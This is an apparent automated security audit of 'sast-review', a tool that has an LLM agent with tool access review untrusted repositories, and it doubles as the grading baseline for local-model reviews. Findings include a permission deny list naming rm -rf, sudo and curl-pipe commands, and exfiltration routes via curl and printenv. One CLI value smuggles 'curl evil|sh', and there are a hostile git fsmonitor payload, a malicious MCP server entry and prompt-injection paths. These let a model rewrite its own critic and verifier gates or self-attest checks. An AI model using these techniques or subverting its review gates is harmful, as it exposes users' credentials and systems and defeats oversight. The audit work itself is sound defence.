# Security Review Baseline — sast-review

**Reviewer:** Automated SAST review pass
**Date:** 2026-09-15
**Scope:** `src/sast_review/` (12 modules, ~5.8k LOC), `templates/permissions.json`, `plugins/graphify.js`, `commands/security-review.md`
**Threat model:** the runner reviews untrusted repositories whose file contents AND repo-local config (`.opencode/`, `.git/config`) reach an LLM agent with tool access.

This file is the comparison baseline for grading local-model reviews of the same codebase. Each finding lists severity, evidence, exploit path, and fix.

---

## HIGH

### F1 — Repo-local git config executes commands during review

**Evidence:** `fingerprint.py:_git` (lines 133-147) scrubs `GIT_CONFIG_NOSYSTEM` and `GIT_CONFIG_GLOBAL=/dev/null` but not `GIT_CONFIG_LOCAL` — git always reads `<repo>/.git/config`. `capture_git_state` (line 175) runs `git status --porcelain`, which honors `core.fsmonitor` (external command spawned via shell on index refresh) and `filter.<drv>.clean` drivers. `inject.py:compute_diff_scope` (lines 657-664) runs `git diff` with no env scrubbing at all.

**Exploit path:** hostile repo ships `.git/config` with `core.fsmonitor = ./payload.sh` → `sast-review --repo evil --repo-id <uuid>` or `--diff` → runner's git invocation executes payload as the user.

**Qualification:** requires `--repo-id` (capture_git_state via knowledge_collect) or `--diff` (compute_diff_scope); bare runs don't hit these paths — but opencode itself runs git internally during the session, so fixing the runner alone doesn't close the class.

**Fix:** add `GIT_CONFIG_LOCAL=/dev/null` (git ≥2.38) or `-c core.fsmonitor=false -c core.untrackedCache=false` to `_git` env/args; reuse the scrubbed env in `compute_diff_scope`; use `git diff --no-textconv`. Durable fix: don't run repo-scoped git.

### F2 — `bash: allow *` makes the permission boundary porous

**Evidence:** `templates/permissions.json` lines 9-29: `"*": "allow"` with denies only for `rm -rf *`, `rm -r *`, `rmdir *`, `sudo *`, `curl * | *`, `wget * | *`, `chmod *`, `chown *`, `mv /* *`, `cp /* *`, `kill *`, `pkill *`, `shutdown *`, `reboot *`.

**Exploit path:** missing denies include flag-order variants (`rm -fr`, `rm -f -r`), `find -delete`, `git clean -fdx`, plain `curl`/`wget` (exfil via `-d @file`), `env`/`printenv` (reads injected secrets — see F5), `security find-generic-password` (macOS keychain), `osascript`, `defaults`, `launchctl`, `crontab`, `git push`, `killall`, `dd`. `webfetch`/`websearch` are `"allow"` — exfil via URL params without curl. `edit` deny (`*` denied, `.security-output/*` allowed) is bypassable via bash writes (`sed -i`, `tee`, `python -c`, `>` redirect). Unset permission keys (`task`, `external_directory`) default to allow.

**Fix:** flip to allowlist — `{"*": "deny", "ls *": "allow", "cat *", "head *", "grep *", "find *", "git status*"/"git diff*"/"git log*", "graphify *", "semgrep *", "mkdir *", "echo *"}`; deny `webfetch`/`websearch` unless required.

### F3 — Target repo's own `.opencode/` configuration is trusted and merged

**Evidence:** `inject.py:210` — `inject_permissions` overwrites only `existing["permission"]`; every other key survives: `provider` (redirect model endpoint to attacker server — all review context flows out, responses steer the agent), `model`, `instructions` (config-level system-prompt injection), `share`, `formatter`. `inject.py:232-234` — `existing_mcp.update(mcp_config)` preserves repo-defined MCP servers: `"mcp": {"x": {"type":"local","command":["/path/to/evil"],"enabled":true}}` spawns at session start — RCE outside the bash permission model. `inject.py:350-354` — `plugin` entries preserved; `.opencode/plugins/*.js` auto-loads and can rewrite bash args (graphify.js itself demonstrates `output.args.command` mutation). `.opencode/agents/*.md` can redefine `@critic`/`@verifier` prompts — `inject_agent_overrides` only sets `model`.

**Exploit path:** hostile repo ships `.opencode/opencode.json` with a malicious MCP server entry → opencode spawns it at session start — no bash needed.

**Fix:** build `opencode.json` from a clean dict rather than merging onto the repo's; quarantine/ignore pre-existing `.opencode/` content during review.

## MEDIUM

### F4 — Gate files live in the edit-allowed `.security-output/` directory

**Evidence:** `permissions.json` line 28 allows edit on `.security-output/*`; `inject.py:181-185` writes `critic-prompt.txt`/`verifier-prompt.txt` there; `inject.py:134-136` writes `PRIOR_KNOWLEDGE.md`; `inject.py:317-320` writes `omlx-unload.sh` (chmod 0700). `security-review.md` step 10b executes `bash .security-output/omlx-unload.sh`; steps 11-12 read the prompts and send verbatim to subagents.

**Exploit path:** prompt-influenced model rewrites the critic/verifier prompts before step 11 → the only quality gate rubber-stamps findings → corrupted claims flow into the knowledge store. Silent integrity failure.

**Fix:** move gate files (prompts, unload script, PRIOR_KNOWLEDGE) under `.opencode/` (edit-denied) or another read-only location; keep only assessment output in `.security-output/`.

### F5 — Full user environment + provider API key leak to the review agent

**Evidence:** `__init__.py:228-232` — `env = {**os.environ, **runtime_env, "OPENCODE_NO_LAZY_LOAD": "1"}` passed to `subprocess.Popen`; `__init__.py:407-411` — `SAST_REVIEW_OMLX_API_KEY` set to the real resolved provider key (`_resolve_provider` reads `apiKey` from `~/.config/opencode/opencode.json`, resolving `{env:VAR}`).

**Exploit path:** every user env secret (AWS_*, GITHUB_TOKEN, …) is readable via the agent's allowed `env`/`printenv`; combined with F2's exfil channels, a prompt-injected model exfiltrates credentials in two calls.

**Fix:** pass a filtered env — PATH, HOME, and only the provider vars opencode needs.

### F6 — Verification/ingest gate is self-attested

**Evidence:** `collect.py` `_check_subagent` treats a `<!-- critic-checkpoint: ... -->` comment without "FAILED" as completed — the model writes those comments itself; `is_complete` gates ingestion (`__init__.py:560`). `knowledge_collect.py` recomputes `observed_evidence_hashes` locally from the finding's own required evidence — coverage matches by construction. `monitor.py:196-219` already reads real subagent `task` sessions from `opencode.db` but never cross-checks them.

**Exploit path:** a prompt-influenced model mints `VERIFIED_ACTIVE` claims and patterns into the shared store — no subagent actually ran.

**Fix:** validate checkpoint claims against `task` session records in opencode.db (already polled by SessionMonitor).

### F7 — TruffleHog results persist cleartext secrets

**Evidence:** `inject.py:617-627` writes raw `--json` output to `.security-output/trufflehog-results.json` — trufflehog JSON includes unredacted `Raw` fields; `__init__.py:496-498` copies it to the run output dir. Step 3b tells the model to use `Redacted`, but the file on disk contains cleartext.

**Exploit path:** a secret scanner that re-exposes secrets into LLM context and persists them unredacted on disk.

**Fix:** strip `Raw`/`RawV2` fields before writing; keep only `Redacted` + detector metadata.

### F8 — `cleanup()` restores backups without re-validating destination

**Evidence:** `inject.py:843-853` — `shutil.copy2(backup, dst)` follows symlinks; no re-check of `dst` between inject-time validation and restore.

**Exploit path:** during the review, model does `ln -sf ~/.zshrc .opencode/commands/security-review.md` → cleanup writes the backed-up file through the symlink → arbitrary-path file write.

**Fix:** re-check `is_symlink()` + containment immediately before restore; write via temp+rename.

### F9 — Same-repo prompt-injection persistence via PRIOR_KNOWLEDGE titles

**Evidence:** `knowledge_collect.py` `render_prior_knowledge` emits `item.title` verbatim; titles are model-authored prose parsed from the previous assessment.

**Exploit path:** a hostile repo reviewed once with `--repo-id` gets arbitrary prose re-injected into review N+1 of the same repo — persistent self-reinjection. (Cross-repo is constrained: `search_security_patterns` returns template strings with regex-pinned `CWE-\d+|OTHER` tokens — hostile prose can't survive generalization.)

**Fix:** sanitize/neutralize instruction-like content in stored titles; delimit prior knowledge as data, not instructions.

## LOW

- **L1** — `inject.py:_callers_from_grep` (lines 751-762): `grep -E` pattern built from unescaped file stems; crafted filenames alter/break the regex → wrong `DIFF_SCOPE.md` caller list. No argv injection. Fix: `re.escape()` stems or `grep -F -f`.
- **L2** — No `--repo` sanity check (`__init__.py:1002-1005`, only `is_dir()`): `--repo ~` injects `.opencode/` into home; worse, if the dir already has `.opencode/opencode.json`, `inject_permissions` mutates the user's real config (restored on clean exit, left modified with `--keep-injected`).
- **L3** — `model_id` interpolated into double-quoted script (`inject.py:290-304`): `--model 'omlx/x"; curl evil|sh #'` yields poisoned `omlx-unload.sh` executed at step 10b. Self-inflicted CLI arg. Fix: whitelist `model_id` chars.
- **L4** — `diff_ref` unvalidated (`inject.py:658`): `--diff "--output=/tmp/x"` parses as git option → writes diff to arbitrary path. Fix: validate ref shape or `--` guard.
- **L5** — `--label`/`repo_name` unsanitized into paths (`__init__.py:173-176`, `:503-505`): explicit `--label` can contain `/` or glob metachars → output-dir traversal; reads bounded by `_is_safe_target_file`, dir creation is not.
- **L6** — Knowledge MCP daemon has no auth (`knowledge_mcp.py`): any local process can query cross-repo patterns on loopback. Minor info disclosure.
- **L7** — `json.loads(proj_config.read_text())` (`inject.py:201`): non-dict JSON in a hostile `opencode.json` crashes the runner mid-injection — fail-closed but abrupt, leaves injected files in place.

## INFORMATIONAL

- **I1** — `monitor.py:283` runs `PRAGMA journal_mode=WAL` on opencode's own `opencode.db` — persistent foreign-DB mutation each poll (benign if already WAL).
- **I2** — `plugins/graphify.js` prepends `echo "..." ; <cmd>` to the model's first bash command — mutates agent commands; reminder text is static and quote-safe (authors documented the backtick risk).
- **I3** — `_track_backup` TOCTOU (`inject.py:105-113`): check→copy window exists but injection runs single-process pre-agent; near-unexploitable in practice.

## VERIFIED STRENGTHS

- All SQL parameterized (`?` placeholders); only `PRAGMA user_version = {int}` interpolated — safe; `executescript` blocks are static DDL.
- `_fts_match_query` (`knowledge_store.py:220-237`): tokens extracted via `[^\W_]+`, each quoted, AND-joined, 512-char/32-token bounds — FTS5 MATCH injection not feasible.
- Knowledge MCP enforces loopback bind + port range (`knowledge_mcp.py:44-47`); `build_knowledge_mcp_config` validates http scheme + loopback host + exact `/mcp` path, no query/fragment (`tools.py:291-295`). Read-only tools with `readOnlyHint`.
- Symlink rejection + `resolve()`/`is_relative_to()` containment at inject time (`inject.py:86-113`), `_is_safe_target_file` (`__init__.py:156-164`), benchmark rmtree guards (`__init__.py:706-713`).
- No `shell=True`/`os.system`/`eval`/`pickle` anywhere; all subprocess calls are argv lists.
- ruamel `YAML(typ="safe", pure=True)` in `okf_export.py`.
- Backup/restore manifest design with cleanup in `finally`.
- Evidence path containment in `fingerprint.py:refresh_evidence` is correct (absolute rejection + resolve + relative_to + is_file).

## SUMMARY

| Severity | Count |
|----------|-------|
| HIGH | 3 (F1, F2, F3) |
| MEDIUM | 6 (F4-F9) |
| LOW | 7 (L1-L7) |
| INFORMATIONAL | 3 (I1-I3) |

**Root cause shared by F1-F3:** the runner treats the target repo as data, but `.opencode/`, `.git/config`, and file content are all executable surfaces for a tool-using model.

**Priority order:** F3 (quarantine repo `.opencode`) → F2 (bash allowlist) → F1 (git config scrub) → F4 (move gate files) → F5 (filter env) → F6 (cross-check checkpoints) → F7 (strip trufflehog Raw).
